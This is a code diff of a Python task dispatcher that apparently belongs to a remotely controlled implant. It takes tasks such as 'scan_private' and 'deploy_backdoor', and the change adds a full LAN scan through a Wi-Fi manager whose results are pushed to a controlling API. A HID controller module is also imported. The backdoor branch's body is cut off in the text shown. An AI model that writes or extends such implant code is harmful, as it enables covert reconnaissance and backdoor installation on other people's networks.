@@ -5,6 +5,7 @@ import tempfile
 import os
 import re
 import scanner
+import wifi_manager
 import hid_controller
 import poller
 
@@ -18,9 +19,16 @@ async def dispatch(task, api_client, cfg):
 
     try:
         if task_type == "scan_private":
-            result = scanner.scan_host(target_ip, timeout=cfg["scan_timeout"])
-            api_client.push_scan(result)
-            poller.add_result(task_id, "completed", result=f"Scanned {target_ip}")
+            if target_ip:
+                print(f"[task_runner] Scanning single host {target_ip}")
+                result = scanner.scan_host(target_ip, timeout=cfg["scan_timeout"])
+                api_client.push_scan(result)
+                poller.add_result(task_id, "completed", result=f"Scanned {target_ip}")
+            else:
+                print(f"[task_runner] Running full LAN scan")
+                found = await scanner.run_lan_scan(wifi_manager, api_client)
+                print(f"[task_runner] LAN scan complete, found {found} hosts")
+                poller.add_result(task_id, "completed", result=f"LAN scan complete, found {found} hosts")
 
         elif task_type == "deploy_backdoor":
             payload = {}
